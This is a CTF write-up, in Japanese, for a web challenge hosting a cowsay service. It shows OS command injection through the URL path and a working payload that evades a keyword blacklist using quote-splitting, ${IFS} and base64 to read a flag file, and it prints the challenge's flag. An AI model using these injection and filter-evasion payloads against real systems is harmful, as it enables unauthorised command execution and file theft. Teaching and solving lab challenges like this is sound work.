# caas renewed:web:352pts
moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo etc moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo etc moo moo moo moo moo etc moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo etc moo moo moo moo etc/cowsay/falg.txt  
[http://caas.web.nitectf.live/](http://caas.web.nitectf.live/)  

[caasRenewed.zip](caasRenewed.zip)  

# Solution
URLとファイルが渡される。  
![site.png](site/site.png)  
```bash
$ curl 'http://caas.web.nitectf.live/cowsay/satoki'
 ________
< satoki >
 --------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```
cowsayコマンドを実行するサービスのようだ。  
```bash
$ curl 'http://caas.web.nitectf.live/cowsay/satoki;pwd'
 ________
< satoki >
 --------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
/usr/games
```
OSコマンドインジェクションが可能である。  
問題文より`/etc/cowsay/falg.txt`にフラグがあるようだが、URL経由なので`/`が渡せない。  
さらに配布されたファイルを見ると、`whitelisted.txt`と`blacklist.txt`が含まれていた。  
ブラックリスト形式でブロックしているようだ。  
```bash
$ curl 'http://caas.web.nitectf.live/cowsay/satoki;printenv'
 ___________________________
< Whoops! I cannot say that >
 ---------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```
ここで`""`をコマンドの途中に挿入できるテクニックを思い出す。  
スペースは`${IFS}`とし、base64をうまく使って`/`を回避してファイル名を指定すればよい。  
以下のように行う(ブラックリストの`sz`も`""`で回避してやる)。  
```bash
$ curl --path-as-is 'http://caas.web.nitectf.live/cowsay/satoki;cat${IFS}$(echo${IFS}"L2V0Yy9jb3dzYXkvZmFs""Zy50eHQ"|b""ase64${IFS}-d);pwd'
 ________
< satoki >
 --------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
nite{9wd_t0_th3_r35cu3_dp54kf_ud9j3od3w}
/usr/games
```
flagが得られた。  

## nite{9wd_t0_th3_r35cu3_dp54kf_ud9j3od3w}